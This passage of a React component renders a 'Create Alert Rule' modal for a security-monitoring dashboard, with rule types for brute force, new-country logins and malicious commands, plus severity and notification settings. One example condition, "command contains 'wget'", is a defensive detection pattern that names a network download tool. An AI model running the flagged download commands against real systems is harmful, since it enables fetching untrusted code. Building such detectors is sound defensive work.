        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="bg-white rounded-2xl shadow-2xl max-w-3xl w-full max-h-[90vh] overflow-y-auto"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="px-6 py-4 border-b border-gray-200 flex items-center justify-between sticky top-0 bg-white z-10">
          <div>
            <h2 className="text-2xl font-bold text-gray-800">Create Alert Rule</h2>
            <p className="text-sm text-gray-500 mt-1">Define conditions for automated alerts</p>
          </div>
          <button 
            onClick={onClose} 
            className="p-2 hover:bg-gray-100 rounded-lg transition"
          >
            <X className="w-5 h-5" />
          </button>
        </div>
        
        <div className="p-6 space-y-6">
          {/* Rule Type Selection */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-2">Rule Type</label>
            <div className="grid grid-cols-3 gap-3">
              <button
                onClick={() => setRuleType('brute_force')}
                className={`p-4 rounded-lg border-2 transition ${
                  ruleType === 'brute_force'
                    ? 'border-[#00D9FF] bg-blue-50'
                    : 'border-gray-200 hover:border-gray-300'
                }`}
              >
                <div className="text-2xl mb-2">🔓</div>
                <div className="font-bold text-sm">Brute Force</div>
                <div className="text-xs text-gray-500 mt-1">Multiple login attempts</div>
              </button>
              <button
                onClick={() => setRuleType('new_country')}
                className={`p-4 rounded-lg border-2 transition ${
                  ruleType === 'new_country'
                    ? 'border-[#00D9FF] bg-blue-50'
                    : 'border-gray-200 hover:border-gray-300'
                }`}
              >
                <div className="text-2xl mb-2">🌍</div>
                <div className="font-bold text-sm">New Country</div>
                <div className="text-xs text-gray-500 mt-1">Unusual location</div>
              </button>
              <button
                onClick={() => setRuleType('command')}
                className={`p-4 rounded-lg border-2 transition ${
                  ruleType === 'command'
                    ? 'border-[#00D9FF] bg-blue-50'
                    : 'border-gray-200 hover:border-gray-300'
                }`}
              >
                <div className="text-2xl mb-2">⚡</div>
                <div className="font-bold text-sm">Malicious Cmd</div>
                <div className="text-xs text-gray-500 mt-1">Suspicious commands</div>
              </button>
            </div>
          </div>

          {/* Rule Name Input */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-2">
              Rule Name <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              value={ruleName}
              onChange={(e) => setRuleName(e.target.value)}
              placeholder="e.g., Multiple Failed SSH Logins"
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00D9FF] focus:border-transparent"
            />
          </div>

          {/* Rule Description */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-2">
              Description <span className="text-red-500">*</span>
            </label>
            <textarea
              value={ruleDescription}
              onChange={(e) => setRuleDescription(e.target.value)}
              placeholder="Describe when this alert should trigger..."
              rows={3}
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00D9FF] focus:border-transparent"
            />
          </div>

          {/* Rule Condition (Advanced) */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-2">
              Condition (Advanced - Optional)
            </label>
            <input
              type="text"
              value={ruleCondition}
              onChange={(e) => setRuleCondition(e.target.value)}
              placeholder="e.g., failed_logins > 5 AND time_window = 5m"
              className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00D9FF] focus:border-transparent font-mono text-sm"
            />
            <p className="text-xs text-gray-500 mt-1">
              Examples: failed_logins &gt; 5, new_country == true, command contains 'wget'
            </p>
          </div>

          {/* Alert Severity Selection */}
          <div>
            <label className="block text-sm font-bold text-gray-700 mb-2">Alert Severity</label>
            <div className="grid grid-cols-4 gap-2">
              {[
                { value: 'low', label: 'LOW', color: 'bg-green-100 text-green-700 border-green-500' },
                { value: 'medium', label: 'MEDIUM', color: 'bg-yellow-100 text-yellow-700 border-yellow-500' },
                { value: 'high', label: 'HIGH', color: 'bg-orange-100 text-orange-700 border-orange-500' },
                { value: 'critical', label: 'CRITICAL', color: 'bg-red-100 text-red-700 border-red-500' }
              ].map(sev => (
                <button
                  key={sev.value}
                  onClick={() => setRuleSeverity(sev.value)}
                  className={`px-4 py-3 rounded-lg font-bold transition border-2 ${
                    ruleSeverity === sev.value 
                      ? sev.color 
                      : 'bg-gray-50 text-gray-600 border-gray-200 hover:border-gray-300'
                  }`}
                >
                  {sev.label}
                </button>
              ))}
            </div>
          </div>

          {/* Notification Settings */}
          <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-lg p-4 border border-blue-200">
            <h3 className="font-bold text-gray-800 mb-3 flex items-center gap-2">
              <Settings className="w-5 h-5 text-[#00D9FF]" />
              Notification Settings
            </h3>
            <div className="space-y-3">
              <label className="flex items-center gap-3 cursor-pointer">
                <input 
                  type="checkbox" 
                  className="w-5 h-5 rounded border-gray-300 text-[#00D9FF] focus:ring-[#00D9FF]" 
                  checked={emailNotif}
                  onChange={(e) => setEmailNotif(e.target.checked)}
                />
                <div className="flex-1">
                  <span className="text-sm font-medium text-gray-800">Send email notification</span>
                  <p className="text-xs text-gray-500">Alert will be sent to your email</p>
                </div>
              </label>
              <label className="flex items-center gap-3 cursor-pointer">
                <input 
                  type="checkbox" 
                  className="w-5 h-5 rounded border-gray-300 text-[#00D9FF] focus:ring-[#00D9FF]" 
                  checked={slackNotif}
                  onChange={(e) => setSlackNotif(e.target.checked)}
                />
                <div className="flex-1">
                  <span className="text-sm font-medium text-gray-800">Send Slack notification</span>
                  <p className="text-xs text-gray-500">Post alert to Slack channel</p>
                </div>
              </label>
              <label className="flex items-center gap-3 cursor-pointer">
                <input 
                  type="checkbox" 
                  className="w-5 h-5 rounded border-gray-300 text-[#00D9FF] focus:ring-[#00D9FF]" 
                  checked={webhookNotif}
                  onChange={(e) => setWebhookNotif(e.target.checked)}
                />
                <div className="flex-1">
                  <span className="text-sm font-medium text-gray-800">Trigger webhook</span>
                  <p className="text-xs text-gray-500">Call external API endpoint</p>
                </div>
              </label>
            </div>
          </div>

          {/* Preview Box */}
          <div className="bg-gray-50 rounded-lg p-4 border border-gray-200">
            <h3 className="font-bold text-gray-800 mb-2">Rule Preview</h3>
            <div className="text-sm text-gray-600 space-y-1">
              <div><span className="font-medium">Name:</span> {ruleName || 'Not set'}</div>
              <div><span className="font-medium">Type:</span> {ruleType.replace('_', ' ').toUpperCase()}</div>
              <div><span className="font-medium">Severity:</span> {ruleSeverity.toUpperCase()}</div>
              <div><span className="font-medium">Notifications:</span> {
                [emailNotif && 'Email', slackNotif && 'Slack', webhookNotif && 'Webhook']
                  .filter(Boolean)
                  .join(', ') || 'None selected'
              }</div>
            </div>
          </div>
        </div>
        
        <div className="px-6 py-4 border-t border-gray-200 flex justify-between sticky bottom-0 bg-white">
          <button
            onClick={onClose}
            className="px-6 py-2 bg-gray-200 text-gray-700 font-bold rounded-lg hover:bg-gray-300 transition"
          >
            Cancel
          </button>
          <button
            onClick={handleCreateRule}
            className="px-6 py-2 bg-gradient-to-r from-[#00D9FF] to-[#8B5CF6] text-white font-bold rounded-lg hover:shadow-lg transition flex items-center gap-2"
          >
            <Check className="w-4 h-4" />
            Create Rule
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
}